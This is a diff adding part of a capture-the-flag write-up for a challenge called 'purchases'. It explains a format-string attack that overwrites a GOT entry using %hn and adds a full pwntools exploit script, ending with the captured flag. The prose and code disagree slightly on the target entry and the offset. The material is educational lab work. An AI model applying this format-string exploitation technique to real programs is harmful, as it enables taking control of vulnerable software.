@@ -157,4 +157,36 @@ After:
 [      8th argument    ][          9th argument        ]
 [%][8][$][p][ ][ ][ ][ ][40][40][40][00][00][00][00][00]
 ```
+#### After a bit of playing around with the amount of spaces, we get the results we want at offset 10 with a padding of 16 spaces. Take note of the number of spaces, it'll be important for later. Now we need to overwrite puts' GOT entry. We'll need to provide around 4198838 characters to overwrite the GOT address to our desired one, but that won't do since the buffer is only 60 bytes in size. We can bypass this by using another format specifier that prints out an assigned number of spaces. And to write to the amount of spaces to the GOT address, we use the `%hn` specifier. Now to craft our final exploit, we need to remember that the format specifiers must be 16 in length for the exploit to work:
+##### exploit.py
+```python
+from pwn import *
+
+#: Connect to challenge server
+# HOST = 'shell.actf.co'
+# PORT = 19011
+# p = remote(HOST,PORT)
+p = process('./purchases')
+print(p.recvuntil('purchase? '))
+
+#: Exploit code
+offset = 8
+printf_got = 0x404018
+flag_plt = 0x4011b6
+
+payload = '%{}x%10$hn '.format(str(flag_plt))
+exploit = payload + p64(printf_got)[:3]
+
+#: Send payload
+p.sendline(exploit)
+p.interactive()
+```
+#### Run the script to get the flag!
+```
+$ python exploit.py
+[...]
+ea27fc00 @@ somewhere else. 
+actf{limited_edition_flag}
+```
+
 
